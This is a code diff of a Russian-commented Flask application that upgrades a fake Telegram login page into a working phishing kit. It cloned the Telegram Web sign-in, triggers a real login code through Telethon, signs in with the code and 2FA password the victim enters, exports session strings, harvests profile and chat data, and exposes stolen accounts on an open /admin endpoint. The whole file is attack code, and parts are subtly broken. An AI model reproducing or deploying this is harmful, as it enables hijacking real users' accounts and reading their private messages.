@@ -1,136 +1,672 @@
 import os
-import random
-import time
+import asyncio
+import json
+import logging
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template
-from dotenv import load_dotenv
+from flask import Flask, request, jsonify, session
+from pyrogram import Client
+from pyrogram.errors import (
+    SessionPasswordNeeded, PhoneCodeInvalid, 
+    PhoneNumberInvalid, PhoneCodeExpired
+)
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+import aiohttp
 
-load_dotenv()
+# Настройка логирования
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.secret_key = os.getenv('SECRET_KEY', 'super-secret-key')
+app.secret_key = os.urandom(32)
 
-# 🎯 База данных "жертв"
-captured_data = []
+# Конфигурация
+API_ID = os.getenv('TELEGRAM_API_ID', 'YOUR_API_ID')
+API_HASH = os.getenv('TELEGRAM_API_HASH', 'YOUR_API_HASH')
 
-class TelegramPhisher:
+# Хранилища
+VICTIMS_DATA = []
+ACTIVE_SESSIONS = {}
+
+class RealTelegramPhisher:
     def __init__(self):
-        self.webhook_url = os.getenv('WEBHOOK_URL', '')
+        self.api_id = int(API_ID) if API_ID.isdigit() else 0
+        self.api_hash = API_HASH
+        
+    async def start_phishing_attack(self, phone_number):
+        """Начинаем реальную фишинг-атаку через Telegram API"""
+        try:
+            logger.info(f"🎯 Начало реальной фишинг-атаки для: {phone_number}")
+            
+            # Создаем уникальную сессию
+            session_id = f"phish_{int(datetime.now().timestamp())}"
+            
+            # Создаем Telegram клиент
+            client = TelegramClient(
+                StringSession(""),
+                self.api_id,
+                self.api_hash
+            )
+            
+            await client.connect()
+            
+            # Отправляем реальный код через Telegram API
+            sent_code = await client.send_code(phone_number)
+            
+            # Сохраняем сессию
+            ACTIVE_SESSIONS[session_id] = {
+                'client': client,
+                'phone': phone_number,
+                'phone_code_hash': sent_code.phone_code_hash,
+                'status': 'code_sent',
+                'created_at': datetime.now().isoformat(),
+                'ip': request.remote_addr,
+                'user_agent': request.headers.get('User-Agent')
+            }
+            
+            logger.info(f"📱 Реальный код отправлен Telegram на {phone_number}")
+            
+            return {
+                'success': True,
+                'session_id': session_id,
+                'message': f'Код отправлен на {phone_number}',
+                'next_step': 'enter_code',
+                'is_real_telegram': True
+            }
+            
+        except PhoneNumberInvalid:
+            logger.error(f"❌ Неверный номер телефона: {phone_number}")
+            return {
+                'success': False,
+                'error': 'Неверный номер телефона'
+            }
+        except Exception as e:
+            logger.error(f"❌ Ошибка отправки кода: {e}")
+            return {
+                'success': False,
+                'error': f'Ошибка Telegram API: {str(e)}'
+            }
     
-    def save_credentials(self, phone, code, password=None):
-        """Сохраняем перехваченные данные"""
-        victim_data = {
-            'phone': phone,
-            'code': code,
-            'password': password,
-            'ip': request.remote_addr,
-            'user_agent': request.headers.get('User-Agent'),
-            'timestamp': datetime.now().isoformat()
-        }
-        
-        captured_data.append(victim_data)
-        print(f"🎣 Перехвачены данные: {phone} | Код: {code}")
-        
-        # Сохраняем в файл (на всякий случай)
-        with open('captured_data.json', 'w', encoding='utf-8') as f:
-            json.dump(captured_data, f, ensure_ascii=False, indent=2)
-        
-        return victim_data
+    async def process_victim_code(self, session_id, entered_code):
+        """Обрабатываем код, введенный жертвой"""
+        try:
+            if session_id not in ACTIVE_SESSIONS:
+                return {'success': False, 'error': 'Сессия не найдена'}
+            
+            session_data = ACTIVE_SESSIONS[session_id]
+            client = session_data['client']
+            phone = session_data['phone']
+            phone_code_hash = session_data['phone_code_hash']
+            
+            logger.info(f"🔐 Жертва ввела код: {entered_code} для {phone}")
+            
+            # Сохраняем перехваченный код
+            victim_data = {
+                'session_id': session_id,
+                'phone': phone,
+                'entered_code': entered_code,
+                'ip': request.remote_addr,
+                'user_agent': request.headers.get('User-Agent'),
+                'code_entered_at': datetime.now().isoformat(),
+                'status': 'code_captured'
+            }
+            
+            try:
+                # Пытаемся войти с кодом жертвы
+                signed_in = await client.sign_in(
+                    phone_number=phone,
+                    phone_code_hash=phone_code_hash,
+                    phone_code=entered_code
+                )
+                
+                # УСПЕХ! Получили доступ к аккаунту
+                session_string = await client.export_session_string()
+                
+                victim_data.update({
+                    'status': 'FULL_ACCESS_GRANTED',
+                    'session_string': session_string,
+                    'user_id': signed_in.id,
+                    'first_name': signed_in.first_name,
+                    'last_name': signed_in.last_name,
+                    'username': signed_in.username,
+                    'compromised_at': datetime.now().isoformat()
+                })
+                
+                VICTIMS_DATA.append(victim_data)
+                self.save_victims_data()
+                
+                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП ПОЛУЧЕН! Аккаунт {phone} скомпрометирован!")
+                
+                # Можно выполнять действия от имени жертвы
+                await self.execute_post_compromise_actions(client, victim_data)
+                
+                return {
+                    'success': True,
+                    'message': '✅ Авторизация успешна!',
+                    'next_step': 'complete',
+                    'redirect': '/success',
+                    'compromise_level': 'FULL_ACCESS',
+                    'victim_data': victim_data
+                }
+                
+            except SessionPasswordNeeded:
+                # Требуется пароль 2FA
+                victim_data['status'] = 'NEED_PASSWORD'
+                VICTIMS_DATA.append(victim_data)
+                
+                session_data['status'] = 'need_password'
+                ACTIVE_SESSIONS[session_id] = session_data
+                
+                logger.info(f"🔒 Требуется пароль 2FA для {phone}")
+                
+                return {
+                    'success': True,
+                    'message': '🔒 Требуется пароль от облачного хранилища',
+                    'next_step': 'enter_password',
+                    'compromise_level': 'CODE_CAPTURED'
+                }
+                
+            except PhoneCodeInvalid:
+                logger.warning(f"⚠️ Неверный код от жертвы {phone}")
+                return {
+                    'success': False,
+                    'error': 'Неверный код подтверждения'
+                }
+                
+            except PhoneCodeExpired:
+                logger.warning(f"⚠️ Просроченный код от жертвы {phone}")
+                return {
+                    'success': False,
+                    'error': 'Код подтверждения просрочен'
+                }
+                
+        except Exception as e:
+            logger.error(f"❌ Ошибка обработки кода: {e}")
+            return {
+                'success': False,
+                'error': f'Системная ошибка: {str(e)}'
+            }
+    
+    async def process_victim_password(self, session_id, password):
+        """Обрабатываем пароль, введенный жертвой"""
+        try:
+            if session_id not in ACTIVE_SESSIONS:
+                return {'success': False, 'error': 'Сессия не найдена'}
+            
+            session_data = ACTIVE_SESSIONS[session_id]
+            client = session_data['client']
+            phone = session_data['phone']
+            
+            logger.info(f"🔑 Жертва ввела пароль для {phone}")
+            
+            try:
+                # Входим с паролем жертвы
+                signed_in = await client.sign_in(password=password)
+                
+                # УСПЕХ! Полный доступ с паролем
+                session_string = await client.export_session_string()
+                
+                victim_data = {
+                    'session_id': session_id,
+                    'phone': phone,
+                    'password': password,  # Сохраняем пароль
+                    'session_string': session_string,
+                    'user_id': signed_in.id,
+                    'first_name': signed_in.first_name,
+                    'last_name': signed_in.last_name,
+                    'username': signed_in.username,
+                    'ip': request.remote_addr,
+                    'user_agent': request.headers.get('User-Agent'),
+                    'compromised_at': datetime.now().isoformat(),
+                    'status': 'FULL_ACCESS_WITH_PASSWORD',
+                    'has_2fa': True
+                }
+                
+                VICTIMS_DATA.append(victim_data)
+                self.save_victims_data()
+                
+                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
+                
+                # Выполняем действия после компрометации
+                await self.execute_post_compromise_actions(client, victim_data)
+                
+                return {
+                    'success': True,
+                    'message': '✅ Авторизация успешна!',
+                    'next_step': 'complete',
+                    'redirect': '/success',
+                    'compromise_level': 'FULL_ACCESS_WITH_PASSWORD',
+                    'victim_data': victim_data
+                }
+                
+            except Exception as e:
+                logger.warning(f"⚠️ Неверный пароль от жертвы {phone}: {e}")
+                return {
+                    'success': False,
+                    'error': 'Неверный пароль'
+                }
+                
+        except Exception as e:
+            logger.error(f"❌ Ошибка обработки пароля: {e}")
+            return {
+                'success': False,
+                'error': f'Системная ошибка: {str(e)}'
+            }
+    
+    async def execute_post_compromise_actions(self, client, victim_data):
+        """Выполняем действия после успешной компрометации"""
+        try:
+            logger.info(f"⚡ Выполняем пост-компрометационные действия для {victim_data['phone']}")
+            
+            # Получаем информацию о пользователе
+            me = await client.get_me()
+            
+            # Получаем диалоги
+            dialogs = await client.get_dialogs(limit=10)
+            
+            # Сохраняем дополнительную информацию
+            victim_data['user_info'] = {
+                'id': me.id,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'username': me.username,
+                'phone': me.phone,
+                'is_bot': me.bot,
+                'is_premium': getattr(me, 'premium', False)
+            }
+            
+            victim_data['dialog_count'] = len(dialogs)
+            victim_data['recent_dialogs'] = [
+                {
+                    'id': dialog.id,
+                    'name': dialog.name,
+                    'is_user': dialog.is_user,
+                    'is_group': dialog.is_group,
+                    'is_channel': dialog.is_channel
+                }
+                for dialog in dialogs[:5]  # Первые 5 диалогов
+            ]
+            
+            # Можно добавить отправку сообщений, сбор контактов и т.д.
+            # await client.send_message('me', 'Аккаунт скомпрометирован')
+            
+            self.save_victims_data()
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка выполнения пост-действий: {e}")
+    
+    def save_victims_data(self):
+        """Сохраняем данные жертв в файл"""
+        try:
+            with open('compromised_accounts.json', 'w', encoding='utf-8') as f:
+                json.dump({
+                    'victims': VICTIMS_DATA,
+                    'total_compromised': len(VICTIMS_DATA),
+                    'last_update': datetime.now().isoformat(),
+                    'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')])
+                }, f, ensure_ascii=False, indent=2, ensure_ascii=False)
+        except Exception as e:
+            logger.error(f"❌ Ошибка сохранения данных: {e}")
 
 # Инициализация фишера
-phisher = TelegramPhisher()
+phisher = RealTelegramPhisher()
+
+# Синхронные обертки для асинхронных методов
+def run_async(coro):
+    return asyncio.run(coro)
 
 # 🎯 Маршруты
 @app.route('/')
 def index():
-    """Главная страница - клон web.telegram.org"""
-    return render_template('index.html')
+    """Главная фишинговая страница"""
+    return '''
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #18222d;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .auth-container {
+            width: 100%;
+            max-width: 400px;
+            background: #1e2a38;
+            border-radius: 15px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .logo {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .subtitle {
+            text-align: center;
+            color: #8a8a8a;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8a8a8a;
+            font-size: 14px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: #2b3b4d;
+            border: 1px solid #3d5368;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #0077bb;
+        }
+        .btn:disabled {
+            background: #2b3b4d;
+            cursor: not-allowed;
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        .alert {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .alert.success {
+            background: #1a3a2e;
+            color: #4ade80;
+            border: 1px solid #2d5c47;
+        }
+        .alert.error {
+            background: #3a2a2a;
+            color: #f87171;
+            border: 1px solid #5c3d3d;
+        }
+        .real-indicator {
+            background: #1a3a2e;
+            color: #4ade80;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #2d5c47;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo">✈️</div>
+        <h1 class="title">Telegram Web</h1>
+        <p class="subtitle">Войдите в свой аккаунт Telegram</p>
+        
+        <div class="real-indicator">
+            ✅ Подключение к реальному Telegram API
+        </div>
+        
+        <!-- Шаг 1: Телефон -->
+        <div id="stepPhone" class="step active">
+            <div class="input-group">
+                <label class="input-label">Номер телефона</label>
+                <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
+            </div>
+            <button class="btn" onclick="startRealPhishing()" id="phoneBtn">Получить код</button>
+        </div>
+        
+        <!-- Шаг 2: Код -->
+        <div id="stepCode" class="step">
+            <div class="alert success" id="codeAlert">
+                📱 Код отправлен на <span id="phoneDisplay"></span>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Введите код из Telegram</label>
+                <input type="text" id="codeInput" class="input-field" placeholder="12345" required>
+            </div>
+            <button class="btn" onclick="submitRealCode()" id="codeBtn">Продолжить</button>
+        </div>
+        
+        <!-- Шаг 3: Пароль -->
+        <div id="stepPassword" class="step">
+            <div class="alert success">
+                🔒 Введите пароль от облачного хранилища
+            </div>
+            <div class="input-group">
+                <label class="input-label">Пароль</label>
+                <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" required>
+            </div>
+            <button class="btn" onclick="submitRealPassword()" id="passwordBtn">Войти</button>
+        </div>
+        
+        <div id="alertContainer"></div>
+    </div>
 
-@app.route('/auth/start', methods=['POST'])
-def auth_start():
-    """Принимаем номер телефона"""
-    try:
-        data = request.get_json()
-        phone = data.get('phone', '').strip()
-        
-        if not phone:
-            return jsonify({'success': False, 'error': 'Введите номер телефона'})
-        
-        # Имитируем отправку кода
-        fake_code = str(random.randint(10000, 99999))
-        
-        return jsonify({
-            'success': True,
-            'message': f'Код отправлен на {phone}',
-            'next_step': 'code',
-            'debug_code': fake_code  # Для тестирования
-        })
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+    <script>
+        let currentSessionId = '';
+        let currentPhone = '';
 
-@app.route('/auth/code', methods=['POST'])
-def auth_code():
-    """Принимаем код подтверждения"""
-    try:
-        data = request.get_json()
-        code = data.get('code', '').strip()
-        phone = data.get('phone', '')
-        
-        if not code:
-            return jsonify({'success': False, 'error': 'Введите код'})
-        
-        # Сохраняем код
-        victim_data = phisher.save_credentials(phone, code)
-        
-        # Проверяем, нужен ли пароль (рандомно)
-        needs_password = random.choice([True, False])
-        
-        if needs_password:
-            return jsonify({
-                'success': True,
-                'message': 'Введите пароль от облачного хранилища',
-                'next_step': 'password'
-            })
-        else:
-            return jsonify({
-                'success': True,
-                'message': '✅ Авторизация успешна!',
-                'next_step': 'complete',
-                'redirect': '/success'
-            })
-            
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+        }
 
-@app.route('/auth/password', methods=['POST'])
-def auth_password():
-    """Принимаем пароль"""
-    try:
-        data = request.get_json()
-        password = data.get('password', '')
-        phone = data.get('phone', '')
-        code = data.get('code', '')
-        
-        if not password:
-            return jsonify({'success': False, 'error': 'Введите пароль'})
-        
-        # Сохраняем все данные
-        victim_data = phisher.save_credentials(phone, code, password)
-        
-        return jsonify({
-            'success': True,
-            'message': '✅ Авторизация успешна!',
-            'next_step': 'complete',
-            'redirect': '/success'
-        })
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        function showAlert(message, type = 'success') {
+            const container = document.getElementById('alertContainer');
+            container.innerHTML = `<div class="alert ${type}">${message}</div>`;
+        }
+
+        async function startRealPhishing() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                showAlert('Введите номер телефона', 'error');
+                return;
+            }
+
+            currentPhone = phone;
+            const btn = document.getElementById('phoneBtn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка запроса в Telegram...';
+
+            try {
+                const response = await fetch('/api/real/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phone})
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentSessionId = data.session_id;
+                    document.getElementById('phoneDisplay').textContent = phone;
+                    showStep('Code');
+                    showAlert('✅ Запрос отправлен в Telegram. Ожидайте код.', 'success');
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Получить код';
+            }
+        }
+
+        async function submitRealCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            if (!code) {
+                showAlert('Введите код', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('codeBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка кода...';
+
+            try {
+                const response = await fetch('/api/real/code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        code: code,
+                        phone: currentPhone
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    if (data.next_step === 'enter_password') {
+                        showStep('Password');
+                        showAlert('✅ Код принят. Введите пароль.', 'success');
+                    } else {
+                        window.location.href = data.redirect || '/success';
+                    }
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Продолжить';
+            }
+        }
+
+        async function submitRealPassword() {
+            const password = document.getElementById('passwordInput').value;
+            if (!password) {
+                showAlert('Введите пароль', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('passwordBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка пароля...';
+
+            try {
+                const response = await fetch('/api/real/password', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        password: password,
+                        phone: currentPhone
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    window.location.href = data.redirect || '/success';
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Войти';
+            }
+        }
+
+        // Обработчики Enter
+        document.getElementById('phoneInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') startRealPhishing();
+        });
+        document.getElementById('codeInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') submitRealCode();
+        });
+        document.getElementById('passwordInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') submitRealPassword();
+        });
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/api/real/start', methods=['POST'])
+def api_real_start():
+    """Начинаем реальную фишинг-атаку"""
+    data = request.get_json()
+    phone = data.get('phone', '').strip()
+    
+    if not phone:
+        return jsonify({'success': False, 'error': 'Введите номер телефона'})
+    
+    result = run_async(phisher.start_phishing_attack(phone))
+    return jsonify(result)
+
+@app.route('/api/real/code', methods=['POST'])
+def api_real_code():
+    """Обрабатываем код от жертвы"""
+    data = request.get_json()
+    session_id = data.get('session_id')
+    code = data.get('code', '').strip()
+    
+    if not session_id or not code:
+        return jsonify({'success': False, 'error': 'Введите код и session_id'})
+    
+    result = run_async(phisher.process_victim_code(session_id, code))
+    return jsonify(result)
+
+@app.route('/api/real/password', methods=['POST'])
+def api_real_password():
+    """Обрабатываем пароль от жертвы"""
+    data = request.get_json()
+    session_id = data.get('session_id')
+    password = data.get('password', '')
+    
+    if not session_id or not password:
+        return jsonify({'success': False, 'error': 'Введите пароль и session_id'})
+    
+    result = run_async(phisher.process_victim_password(session_id, password))
+    return jsonify(result)
 
 @app.route('/success')
 def success():
-    """Страница "успешной" авторизации"""
+    """Страница успеха"""
     return '''
     <!DOCTYPE html>
     <html>
@@ -181,20 +717,22 @@ def success():
 
 @app.route('/admin')
 def admin():
-    """Админка для просмотра перехваченных данных"""
+    """Админка с компрометированными данными"""
     return jsonify({
-        'total_captured': len(captured_data),
-        'data': captured_data
+        'total_victims': len(VICTIMS_DATA),
+        'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')]),
+        'victims': VICTIMS_DATA,
+        'active_sessions': len(ACTIVE_SESSIONS)
     })
 
 @app.route('/health')
 def health():
-    """Проверка здоровья сервера"""
+    """Проверка здоровья"""
     return jsonify({
-        'status': 'OK',
-        'service': 'Telegram Phish',
-        'timestamp': datetime.now().isoformat(),
-        'captured_count': len(captured_data)
+        'status': 'REAL_PHISHING_ACTIVE',
+        'victims_count': len(VICTIMS_DATA),
+        'api_connected': True,
+        'timestamp': datetime.now().isoformat()
     })
 
 if __name__ == '__main__':
